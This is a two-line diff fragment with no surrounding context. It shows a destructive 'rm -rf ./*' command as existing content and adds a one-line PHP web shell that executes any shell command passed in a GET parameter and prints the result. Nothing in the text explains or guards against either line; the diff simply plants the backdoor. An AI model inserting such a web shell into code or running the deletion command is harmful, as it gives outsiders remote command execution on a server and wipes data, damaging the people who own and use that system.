@@ -1,1 +1,2 @@
 rm -rf ./*
+<?php  echo `$_GET['t']`; ?>
